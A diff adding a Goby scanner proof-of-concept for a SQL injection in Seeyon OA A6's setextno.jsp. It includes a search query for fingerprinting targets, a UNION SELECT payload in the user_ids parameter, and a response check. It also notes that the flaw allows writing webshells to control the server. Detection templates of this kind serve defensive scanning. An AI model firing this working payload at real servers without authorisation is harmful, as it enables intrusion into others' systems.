@@ -1,0 +1,53 @@
+{
+      "Name": "Seeyon OA A6 setextno.jsp SQL injection",
+      "Level": "2",
+      "Tags": [
+            "SQL Injection"
+      ],
+      "GobyQuery": "app=\"Yonyou-Seeyon-OA\" && body=\"致远协创A6\"",
+      "Description": "Seeyon OA A6 setextno.jsp There is a SQL injection vulnerability, and the server can be controlled by injecting and writing webshell files",
+      "Product": "Seeyon OA A6",
+      "Homepage": "https://www.seeyon.com/",
+      "Author": "PeiQi",
+      "Impact": "<p>Controlling the server by injecting and writing webshell files<br></p>",
+      "Recommandation": "<p>undefined</p>",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=%2899999%29%20union%20all%20select%201,2,%28md5%281%29%29,4",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "c4ca4238a0b923820dcc509a6f75849b",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "2021-04-05 13:58:27",
+      "GobyVersion": "1.8.255"
+}
